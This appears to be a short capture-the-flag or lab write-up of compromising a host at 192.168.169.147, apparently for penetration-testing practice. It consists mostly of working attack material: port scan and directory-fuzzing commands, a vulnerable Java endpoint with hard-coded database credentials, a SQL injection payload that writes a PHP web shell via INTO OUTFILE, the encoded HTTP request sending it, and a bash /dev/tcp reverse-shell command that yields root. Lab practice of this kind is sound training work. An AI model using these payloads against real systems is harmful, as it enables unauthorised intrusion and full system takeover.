```nmap
Discovered open port 22/tcp on 192.168.169.147
Discovered open port 30455/tcp on 192.168.169.147
Discovered open port 17445/tcp on 192.168.169.147
```

```
	@GetMapping("/issue/checkByPriority")
	public String checkByPriority(@RequestParam("priority") String priority, Model model) {
		// 
		// Custom code, need to integrate to the JPA
		//
	    Properties connectionProps = new Properties();
	    connectionProps.put("user", "issue_user");
	    connectionProps.put("password", "ManagementInsideOld797");
        try {
			conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
		    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";
            System.out.println(query);
		    Statement stmt = conn.createStatement();
		    stmt.executeQuery(query);
```

```
ffuf -u http://192.168.207.147:30455/FUZZ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.html,.txt

```

Found phpinfo.php

```
http://192.168.169.147:30455/phpinfo.php
## PHP Variables

|Variable|Value|
|---|---|
|$_SERVER['USER']|root|
|$_SERVER['HOME']|/root|
|$_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS']|1|
|$_SERVER['HTTP_CONNECTION']|keep-alive|
|$_SERVER['HTTP_ACCEPT_ENCODING']|gzip, deflate|
|$_SERVER['HTTP_ACCEPT_LANGUAGE']|en-US,en;q=0.5|
|$_SERVER['HTTP_ACCEPT']|text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8|
|$_SERVER['HTTP_USER_AGENT']|Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0|
|$_SERVER['HTTP_HOST']|192.168.169.147:30455|
|$_SERVER['REDIRECT_STATUS']|200|
|$_SERVER['SERVER_NAME']|localhost|
|$_SERVER['SERVER_PORT']|30455|
|$_SERVER['SERVER_ADDR']|192.168.169.147|
|$_SERVER['REMOTE_PORT']|38314|
|$_SERVER['REMOTE_ADDR']|192.168.45.216|
|$_SERVER['SERVER_SOFTWARE']|nginx/1.18.0|
|$_SERVER['GATEWAY_INTERFACE']|CGI/1.1|
|$_SERVER['REQUEST_SCHEME']|http|
|$_SERVER['SERVER_PROTOCOL']|HTTP/1.1|
|$_SERVER['DOCUMENT_ROOT']|/srv/http|
|$_SERVER['DOCUMENT_URI']|/phpinfo.php|
|$_SERVER['REQUEST_URI']|/phpinfo.php|
|$_SERVER['SCRIPT_NAME']|/phpinfo.php|
|$_SERVER['CONTENT_LENGTH']|_no value_|
|$_SERVER['CONTENT_TYPE']|_no value_|
|$_SERVER['REQUEST_METHOD']|GET|
|$_SERVER['QUERY_STRING']|_no value_|
|$_SERVER['SCRIPT_FILENAME']|/srv/http/phpinfo.php|
|$_SERVER['FCGI_ROLE']|RESPONDER|
|$_SERVER['PHP_SELF']|/phpinfo.php|
|$_SERVER['REQUEST_TIME_FLOAT']|1689867750.5312|
|$_SERVER['REQUEST_TIME']|1689867750|

```

`/srv/http` is the root. We should be able to write there.

```
/issue/checkByPriority?priority=normal'UNION SELECT'<?php echo system($_REQUEST["c"]);?>'INTO OUTFILE'/srv/http/cmd.php'-- -
```

Created the query above to write to to there.

```
POST /issue/checkByPriority?priority=NORMAL%27%55%4e%49%4f%4e%20%53%45%4c%45%43%54%27%3c%3f%70%68%70%20%65%63%68%6f%20%73%79%73%74%65%6d%28%24%5f%52%45%51%55%45%53%54%5b%22%63%22%5d%29%3b%3f%3e%27%49%4e%54%4f%20%4f%55%54%46%49%4c%45%27%2f%73%72%76%2f%68%74%74%70%2f%63%6d%64%2e%70%68%70%27%2d%2d%20%2d HTTP/1.1
Host: 192.168.169.147:17445
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.169.147:17445/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=EBA66A556F9247DBAD897C55B75BA7F6
Connection: close

```

Payload sent above.

```
192.168.169.147:30455/cmd.php?c=%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F192.168.45.216%2F30455 0>%261
```

Sent payload and got root on reverse shell.
